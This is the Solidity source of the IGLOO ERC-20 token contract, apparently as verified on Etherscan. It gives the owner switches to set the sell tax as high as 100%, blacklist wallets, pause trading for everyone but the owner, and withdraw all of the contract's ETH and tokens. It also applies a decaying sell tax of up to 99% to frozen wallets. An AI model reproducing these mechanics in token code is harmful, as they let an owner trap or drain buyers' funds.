/**
 *Submitted for verification at Etherscan.io on 2023-01-22
*/

/**
    Twitter: https://twitter.com/Penguin_MPG
    Telegram: https://t.me/MurderPenguin
 */

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IIGLOO {
    function balanceOf(address account) external returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function resetLastFreeze(address account) external;
}

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IRouter {
    function factory() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
}

interface IxIGLOO {
    function deposit() external payable;
}

interface IFactory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract IGLOO is IERC20, Ownable {
    string public constant _name = "IGLOO";
    string public constant _symbol = "IGLOO";
    uint8 public constant _decimals = 18;

    uint256 public _totalSupply = 100000000 * (10 ** 18);
    mapping (address => uint256) public _balances;
    mapping (address => mapping (address => uint256)) public _allowances;

    mapping (address => uint256) public _lastFreeze;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    mapping (address => bool) public noTax;
    mapping (address => bool) public noMax;
    mapping (address => bool) public blacklist;
    address public treasury;
    address public dexPair;
    uint256 public buyFee = 0;
    uint256 public sellFee = 2500;
    uint256 private _tokens = 0;
    IRouter public router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address public icebox;
    bool private _swapping;
    bool public tradingPaused = true;
    uint256 public maxTx = 2000000 * (10 ** 18);
    uint256 public maxWallet = 2000000 * (10 ** 18);
    IxIGLOO staking;

    modifier swapping() {
        _swapping = true;
        _;
        _swapping = false;
    }

    constructor (address _treasury) {
        treasury = _treasury;
        dexPair = IFactory(router.factory()).createPair(WETH, address(this));
        _allowances[address(this)][address(router)] = type(uint256).max;

        noTax[msg.sender] = true;
        noMax[msg.sender] = true;
        noMax[address(dexPair)] = true;
        noMax[address(this)] = true;
        noMax[address(0)] = true;
        noMax[address(router)] = true;
        noMax[0xD152f549545093347A162Dce210e7293f1452150] = true;

        approve(address(router), type(uint256).max);
        approve(address(dexPair), type(uint256).max);

        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function resetLastFreeze(address account) external {
        require(msg.sender == icebox);
        _lastFreeze[account] = block.timestamp;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure returns (uint8) {
        return _decimals;
    }

    function symbol() external pure returns (string memory) {
        return _symbol;
    }

    function name() external pure returns (string memory) {
        return _name;
    }

    function getOwner() external view returns (address) {
        return owner();
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            require(_allowances[sender][msg.sender] >= amount, "Insufficient allowance");
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }

        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) private returns (bool) {
        require(!tradingPaused || sender == owner(), "Trading paused");
        require((!blacklist[sender] && !blacklist[recipient]) || sender == owner(), "Address blacklisted");
        if (_swapping) {
            require(maxTx >= amount || noMax[recipient] || sender == owner(), "Max triggered");
            require(maxWallet >= amount + _balances[recipient] || noMax[recipient] || sender == owner(), "Max triggered");
            return _basicTransfer(sender, recipient, amount);
        }

        bool _sell = recipient == dexPair || recipient == address(router);

        if (_sell) {
            if (msg.sender != dexPair && !_swapping && _tokens > 0) _payTreasury();
        }

        require(_balances[sender] >= amount, "Insufficient balance");
        _balances[sender] = _balances[sender] - amount;

        uint256 amountReceived = (((sender == dexPair || sender == address(router)) || (recipient == dexPair || recipient == address(router))) ? !noTax[sender] && !noTax[recipient] : false) ? _calcAmount(sender, recipient, amount) : amount;
        require(maxTx >= amountReceived || noMax[recipient] || sender == owner(), "Max triggered");
        require(maxWallet >= amountReceived + _balances[recipient] || noMax[recipient] || sender == owner(), "Max triggered");

        _balances[recipient] = _balances[recipient] + amountReceived;

        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) private returns (bool) {
        require(_balances[sender] >= amount, "Insufficient balance");
        _balances[sender] = _balances[sender] - amount;
        _balances[recipient] = _balances[recipient] + amount;

        return true;
    }

    function _calcAmount(address sender, address receiver, uint256 amount) private returns (uint256) {
        bool _sell = receiver == dexPair || receiver == address(router);
        uint256 _sellFee = sellFee;
        if (_sell) {
            _sellFee = reqSellTax(sender);
        }
        uint256 _fee = _sell ? _sellFee : buyFee;
        uint256 _tax = amount * _fee / 10000;
        if (_fee > 0) {
            _tokens += _tax;
            _balances[address(this)] = _balances[address(this)] + _tax;
            emit Transfer(sender, address(this), _tax);
        }
        return amount - _tax;
    }

    function _payTreasury() private swapping {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WETH;
        uint256 _preview = address(this).balance;
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(balanceOf(address(this)), 0, path, address(this), block.timestamp);
        uint256 _net = address(this).balance - _preview;
        if (_net > 0) {
            payable(treasury).call{value: _net * 7000 / 10000}("");
            staking.deposit{value: _net * 3000 / 10000}();
        }
        _tokens = 0;
    }

    function setTreasury(address _treasury) external onlyOwner {
        treasury = _treasury;
    }

    function setStaking(address _xigloo) external onlyOwner {
        staking = IxIGLOO(_xigloo);
    }

    function setIcebox(address _icebox) external onlyOwner {
        icebox = _icebox;
    }

    function setNoTax(address _wallet, bool _value) external onlyOwner {
        noTax[_wallet] = _value;
    }

    function reqNoTax(address _wallet) external view returns (bool) {
        return noTax[_wallet];
    }

    function setNoMax(address _wallet, bool _value) external onlyOwner {
        noMax[_wallet] = _value;
    }

    function reqNoMax(address _wallet) external view returns (bool) {
        return noMax[_wallet];
    }

    function setMaxTx(uint256 _maxTx) external onlyOwner {
        maxTx = _maxTx;
    }

    function reqMaxTx() external view returns (uint256) {
        return maxTx;
    }

    function setMaxWallet(uint256 _maxWallet) external onlyOwner {
        maxWallet = _maxWallet;
    }

    function reqMaxWallet() external view returns (uint256) {
        return maxWallet;
    }

    function setBlacklist(address _wallet, bool _value) external onlyOwner {
        blacklist[_wallet] = _value;
    }

    function reqBlacklist(address _wallet) external view returns (bool) {
        return blacklist[_wallet];
    }

    function setTradingPaused(bool _tradingPaused) external onlyOwner {
        tradingPaused = _tradingPaused;
    }

    function reqTradingPaused() external view returns (bool) {
        return tradingPaused;
    }

    function setBuyTax(uint256 _buyFee) external onlyOwner {
        require(_buyFee <= 10000);
        buyFee = _buyFee;
    }

    function reqBuyTax() external view returns (uint256) {
        return buyFee;
    }

    function setSellTax(uint256 _sellFee) external onlyOwner {
        require(_sellFee <= 10000);
        sellFee = _sellFee;
    }

    function reqSellTax(address _wallet) public view returns (uint256) {
        uint256 _sellFee = sellFee;
        if (_lastFreeze[_wallet] > 0) {
            uint256 _days = (100 * ((block.timestamp - _lastFreeze[_wallet]) / 86400));
            if (9900 >= _days) {
                _sellFee = 9900 - _days;
                if (_sellFee < sellFee) {
                    _sellFee = sellFee;
                }
            } else {
                _sellFee = sellFee;
            }
        }
        return _sellFee;
    }

    function reqLastFreeze(address _wallet) external view returns (uint256) {
        return _lastFreeze[_wallet];
    }

    function reqDexPair() external view returns (address) {
        return dexPair;
    }

    function reqTreasury() external view returns (address) {
        return treasury;
    }

    function transferETH() external onlyOwner {
        payable(msg.sender).call{value: address(this).balance}("");
    }

    function transferERC(address token) external onlyOwner {
        IERC20 Token = IERC20(token);
        Token.transfer(msg.sender, Token.balanceOf(address(this)));
    }

    receive() external payable {}
}